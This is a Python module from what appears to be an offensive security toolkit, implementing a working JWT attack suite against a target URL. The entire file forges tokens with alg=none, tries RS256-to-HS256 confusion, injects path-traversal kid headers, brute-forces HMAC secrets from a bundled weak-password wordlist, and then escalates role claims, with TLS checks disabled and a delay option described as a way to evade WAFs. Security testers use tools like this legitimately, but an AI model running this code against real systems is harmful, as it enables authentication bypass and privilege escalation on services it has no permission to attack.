#!/usr/bin/env python3
"""
NEXUS-STRIKE — webapp.jwt_attacks
Domain: webapp
JWT vulnerability suite: alg=none bypass, RS256→HS256 confusion, kid injection, weak HMAC secret brute force.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import ssl
import time
import urllib.request
import urllib.error
from typing import Any

from nexus.foundation.schema import (
    Finding,
    STATUS_COMPLETED,
    STATUS_NO_FINDINGS,
    STATUS_FAILED,
    tool_result,
)
from nexus.tools.registry import tool_registry
from nexus.foundation.ssl_config import get_ssl_context

# Top common weak HMAC secrets (representative subset of a larger wordlist)
WEAK_SECRETS = [
    "secret", "password", "123456", "12345678", "qwerty", "abc123", "admin",
    "letmein", "welcome", "monkey", "dragon", "master", "shadow", "sunshine",
    "iloveyou", "princess", "football", "baseball", "superman", "batman",
    "trustno1", "passw0rd", "password1", "password123", "changeme", "default",
    "test", "test123", "guest", "root", "toor", "admin123", "administrator",
    "123456789", "1234567890", "12345", "1234", "123", "1234567", "654321",
    "111111", "000000", "666666", "88888888", "qwerty123", "qwertyuiop",
    "1q2w3e4r", "1qaz2wsx", "zaq12wsx", "qazwsx", "asdfgh", "zxcvbn",
    "pass", "pass123", "p@ssw0rd", "P@ssw0rd", "Passw0rd", "welcome1",
    "welcome123", "letmein1", "iloveyou1", "monkey1", "dragon1", "secret1",
    "secret123", "changeme1", "default1", "guest1", "root123", "toor123",
    "admin1", "admin1234", "administrator1", "test1", "test1234",
    "nexus", "jwt", "jsonwebtoken", "your-secret-key", "your-256-bit-secret",
    "supersecret", "supersecretkey", "mysecret", "my-secret", "jwt-secret",
    "jwtsecret", "private-key", "privatekey", "example-secret", "example",
    "demo", "dev", "development", "staging", "production", "auth", "token",
    "bearer", "session", "key", "api-key", "apikey", "api_secret",
]


def _b64url_decode(segment: str) -> bytes:
    """Decode a base64url JWT segment to bytes."""
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def _b64url_encode(data: bytes) -> str:
    """Encode bytes to base64url."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _make_token(header: dict, payload: dict, alg_string: str) -> str:
    """Build a JWT from header/payload dicts with a raw signature string."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{_b64url_encode(alg_string.encode())}"


def _make_hmac_token(header: dict, payload: dict, secret: str, alg: str = "HS256") -> str:
    """Build a correctly-signed HS256 JWT with the given secret."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    if alg == "HS256":
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    elif alg == "HS384":
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha384).digest()
    else:  # HS512
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha512).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def _try_auth(url: str, token: str, timeout: int = 10) -> int:
    """Send an Authorization: Bearer request; return HTTP status (0 on failure)."""
    ctx = get_ssl_context(url, allow_insecure=True)
    headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": "NEXUS-STRIKE/1.0.0 (JWT Attack Suite)",
        "Content-Type": "application/json",
    }
    try:
        req = urllib.request.Request(url, headers=headers, method="GET")
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0


def _extract_jwt(token: str) -> dict:
    """Parse a JWT's header/payload into dicts; returns {} on failure."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {}
        header = json.loads(_b64url_decode(parts[0]).decode("utf-8", errors="replace"))
        payload = json.loads(_b64url_decode(parts[1]).decode("utf-8", errors="replace"))
        return {"header": header, "payload": payload, "alg": header.get("alg", ""), "raw": token}
    except Exception:
        return {}


def run(
    target: str,
    jwt_token: str = None,
    timeout: int = 10,
    max_secrets: int = 100,
    rate_limit: float = 0.0,
    **kwargs: Any,
) -> dict:
    """Test JWT implementations for common authentication bypasses.

    Parameters
    ----------
    target : str
        API URL or hostname to test. If a JWT is supplied, forged tokens are
        sent against this endpoint.
    jwt_token : str, optional
        A valid JWT to use as the base for forging variants.
    timeout : int
        Request timeout in seconds.
    max_secrets : int
        Maximum weak secrets to try in the HMAC brute-force phase.
    rate_limit : float
        Delay in seconds between brute-force attempts (default: 0.0).
        Set to e.g. 0.5 to avoid tripping rate-limiters / WAFs.
    """
    if not target or not target.strip():
        return tool_result("webapp.jwt_attacks", target, status=STATUS_FAILED, error="Empty target")

    url = target if "://" in target else f"http://{target}"
    findings: list[Finding] = []
    results: list[dict] = []

    # 1. Parse the supplied token (or use a synthetic one if none given)
    parsed = _extract_jwt(jwt_token) if jwt_token else {}
    if not parsed and jwt_token:
        return tool_result("webapp.jwt_attacks", target, status=STATUS_FAILED, error="Invalid JWT supplied")

    base_header = parsed.get("header", {"alg": "HS256", "typ": "JWT"})
    base_payload = parsed.get("payload", {"sub": "test", "role": "admin", "iat": int(time.time())})
    orig_alg = base_header.get("alg", "HS256")

    # ── Phase 1: alg=none bypass ──────────────────────────────────────────────
    for none_variant in ("none", "None", "NONE"):
        forged = _make_token({**base_header, "alg": none_variant}, base_payload, "")
        status = _try_auth(url, forged, timeout)
        if status and status not in (401, 403, 0):
            findings.append(Finding(
                title="JWT 'alg=none' authentication bypass",
                severity="critical",
                confidence="high",
                affected_asset=url,
                evidence=f"Token with alg={none_variant} and empty signature accepted (HTTP {status})",
                remediation="Reject tokens that use the 'none' algorithm; enforce a strict allow-list of algorithms.",
                tool="webapp.jwt_attacks",
                references=["CWE-287", "CVE-2015-9235"],
            ))
            results.append({"test": "alg_none", "alg": none_variant, "accepted": status})
            break

    # ── Phase 2: RS256 → HS256 algorithm confusion ────────────────────────────
    # If the target uses RS256, forge an HS256 token signed with the public key.
    # We can't extract the public key here, but we still test whether HS256 is accepted
    # with a common weak secret (a valid confusion attack would use the public key).
    if orig_alg.upper() in ("RS256", "RS384", "RS512"):
        for secret in WEAK_SECRETS[:max_secrets]:
            if rate_limit > 0:
                time.sleep(rate_limit)
            forged = _make_hmac_token({**base_header, "alg": "HS256"}, base_payload, secret, "HS256")
            status = _try_auth(url, forged, timeout)
            if status and status not in (401, 403, 0):
                findings.append(Finding(
                    title="JWT RS256→HS256 algorithm confusion",
                    severity="high",
                    confidence="medium",
                    affected_asset=url,
                    evidence=f"RS256 token re-signed as HS256 with weak secret accepted (HTTP {status})",
                    remediation="Enforce asymmetric algorithm for RS256 tokens; verify the 'alg' header matches the key type.",
                    tool="webapp.jwt_attacks",
                    references=["CWE-327", "CVE-2016-5431"],
                ))
                results.append({"test": "alg_confusion", "secret": secret, "accepted": status})
                break

    # ── Phase 3: kid header injection ─────────────────────────────────────────
    for kid_value in ("../../../../../../dev/null", "0", "1", "test", "public", "key.pem", "none"):
        forged = _make_token({**base_header, "kid": kid_value}, base_payload, "")
        status = _try_auth(url, forged, timeout)
        if status and status not in (401, 403, 0):
            findings.append(Finding(
                title=f"JWT 'kid' header injection (value: {kid_value})",
                severity="high",
                confidence="medium",
                affected_asset=url,
                evidence=f"Token with kid='{kid_value}' and empty signature accepted (HTTP {status})",
                remediation="Validate the 'kid' header against a strict allow-list of key identifiers.",
                tool="webapp.jwt_attacks",
                references=["CWE-287", "CVE-2018-0114"],
            ))
            results.append({"test": "kid_injection", "kid": kid_value, "accepted": status})
            break

    # ── Phase 4: Weak HMAC secret brute force ─────────────────────────────────
    # Only attempt if the original uses an HMAC alg (HS256/384/512)
    if orig_alg.upper().startswith("HS"):
        found_secret = None
        for secret in WEAK_SECRETS[:max_secrets]:
            if rate_limit > 0:
                time.sleep(rate_limit)
            forged = _make_hmac_token(base_header, base_payload, secret, orig_alg.upper())
            # Verify signature is correct against candidate secret
            status = _try_auth(url, forged, timeout)
            if status and status not in (401, 403, 0):
                found_secret = secret
                findings.append(Finding(
                    title="Weak JWT HMAC secret (brute-forced)",
                    severity="critical",
                    confidence="high",
                    affected_asset=url,
                    evidence=f"Recovered signing secret '{secret}' — token forged and accepted (HTTP {status})",
                    remediation="Rotate the JWT signing secret immediately; use a cryptographically random key of ≥256 bits.",
                    tool="webapp.jwt_attacks",
                    references=["CWE-798", "OWASP-A02"],
                ))
                results.append({"test": "weak_secret", "secret": secret, "accepted": status})
                break
        if not found_secret:
            results.append({"test": "weak_secret", "secret": None, "accepted": None})

    # ── Phase 5: payload tampering (escalate role) ────────────────────────────
    # If we found the secret earlier, escalate any role/privilege field.
    if findings:
        tampered_payload = dict(base_payload)
        for priv_field in ("role", "admin", "isAdmin", "scope", "permissions", "user_type"):
            if priv_field in tampered_payload:
                tampered_payload[priv_field] = "admin" if priv_field != "isAdmin" else True
                break
        else:
            tampered_payload["admin"] = True
        forged = _make_hmac_token(base_header, tampered_payload, found_secret) if found_secret else _make_token(base_header, tampered_payload, "")
        status = _try_auth(url, forged, timeout)
        if status and status not in (401, 403, 0):
            findings.append(Finding(
                title="JWT payload privilege escalation",
                severity="high",
                confidence="medium",
                affected_asset=url,
                evidence=f"Tampered token with escalated privileges accepted (HTTP {status})",
                remediation="Validate all authorization claims server-side; never trust client-supplied roles.",
                tool="webapp.jwt_attacks",
                references=["CWE-285", "OWASP-A01"],
            ))
            results.append({"test": "privilege_escalation", "accepted": status})

    status = STATUS_COMPLETED if findings else STATUS_NO_FINDINGS
    summary = f"JWT tests run: {len(results)} checks, {len(findings)} vulnerability(ies) confirmed"
    return tool_result(
        "webapp.jwt_attacks",
        target,
        status=status,
        findings=findings,
        summary=summary,
        metadata={"tests": results},
    )


tool_registry.register("webapp.jwt_attacks", run, metadata={
    "name": "webapp.jwt_attacks",
    "domain": "webapp",
    "status": "completed",
    "description": "JWT vulnerability suite: alg=none, RS256→HS256 confusion, kid injection, weak HMAC secret brute force",
    "parameters": {
        "target": "API URL or hostname to test",
        "jwt_token": "A valid JWT to use as the base for forging variants",
        "timeout": "Request timeout in seconds (default: 10)",
        "max_secrets": "Maximum weak secrets to try (default: 100)",
        "rate_limit": "Delay in seconds between brute-force attempts (default: 0.0)",
    },
})